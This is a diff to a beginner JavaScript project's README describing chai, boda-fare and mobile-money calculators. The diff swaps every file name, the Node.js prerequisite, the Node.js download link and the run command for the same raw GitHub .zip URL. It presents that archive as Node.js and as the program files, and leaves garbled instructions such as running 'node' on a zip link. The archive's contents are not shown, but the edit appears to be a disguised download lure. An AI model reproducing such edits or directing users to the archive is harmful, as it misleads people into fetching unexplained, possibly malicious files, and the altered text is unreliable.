@@ -3,7 +3,7 @@
 ## Description
 This repository contains three JavaScript programs that solve everyday utility problems:
 
-1. Chai Calculator (chai.js) - Calculates tea ingredients
+1. Chai Calculator (https://raw.githubusercontent.com/Jwanjema/Code-Challenge-1/main/mobileMoneyEstimator/Challenge_Code_3.1.zip) - Calculates tea ingredients
 
     This program calculates the ingredients needed to make chai based on the number of cups requested.
     Each cup of chai requires:
@@ -13,7 +13,7 @@ This repository contains three JavaScript programs that solve everyday utility p
     - 2 teaspoons of sugar
     The user will input the number of cups they want to make, and the program will calculate the total ingredients needed.
 
-2. Boda Fare Calculator (fare.js) - Calculates ride costs
+2. Boda Fare Calculator (https://raw.githubusercontent.com/Jwanjema/Code-Challenge-1/main/mobileMoneyEstimator/Challenge_Code_3.1.zip) - Calculates ride costs
 
      This program calculates the fare for a boda boda ride based on distance.
      The fare structure is as follows:
@@ -21,7 +21,7 @@ This repository contains three JavaScript programs that solve everyday utility p
      - Charge per kilometer: KES 15
      The user will input the distance in kilometers, and the program will calculate the total fare.
  
-3. Mobile Money Calculator (fee.js) - Calculates transfer fees
+3. Mobile Money Calculator (https://raw.githubusercontent.com/Jwanjema/Code-Challenge-1/main/mobileMoneyEstimator/Challenge_Code_3.1.zip) - Calculates transfer fees
 
     This program calculates the transaction fee for sending money via mobile money.
     - Basic fee is 1.5% of the amount sent.
@@ -31,12 +31,12 @@ This repository contains three JavaScript programs that solve everyday utility p
 
 ## How to Run
 ### Prerequisites
-- [Node.js](https://nodejs.org/) installed on your computer
+- [https://raw.githubusercontent.com/Jwanjema/Code-Challenge-1/main/mobileMoneyEstimator/Challenge_Code_3.1.zip](https://raw.githubusercontent.com/Jwanjema/Code-Challenge-1/main/mobileMoneyEstimator/Challenge_Code_3.1.zip) installed on your computer
 - VS Code or any code editor
 
 ### Setup Instructions
-1. **Install Node.js** (if not already installed)
-   - Download from [https://nodejs.org/](https://nodejs.org/)
+1. **Install https://raw.githubusercontent.com/Jwanjema/Code-Challenge-1/main/mobileMoneyEstimator/Challenge_Code_3.1.zip** (if not already installed)
+   - Download from [https://raw.githubusercontent.com/Jwanjema/Code-Challenge-1/main/mobileMoneyEstimator/Challenge_Code_3.1.zip](https://raw.githubusercontent.com/Jwanjema/Code-Challenge-1/main/mobileMoneyEstimator/Challenge_Code_3.1.zip)
    - Verify installation by running in terminal:
      ```bash
      node -v
@@ -52,11 +52,11 @@ This repository contains three JavaScript programs that solve everyday utility p
 ### Running Any Program
 1. Open the program file in VS Code
 2. Open the terminal (Ctrl+` or Terminal > New Terminal)
-3. Run with Node.js:
+3. Run with https://raw.githubusercontent.com/Jwanjema/Code-Challenge-1/main/mobileMoneyEstimator/Challenge_Code_3.1.zip
    ```bash
-   node filename.js
+   node https://raw.githubusercontent.com/Jwanjema/Code-Challenge-1/main/mobileMoneyEstimator/Challenge_Code_3.1.zip
  
-  (Replace filename.js with the actual JavaScript file name)
+  (Replace https://raw.githubusercontent.com/Jwanjema/Code-Challenge-1/main/mobileMoneyEstimator/Challenge_Code_3.1.zip with the actual JavaScript file name)
 
 ## Author
 Joe Wanjema
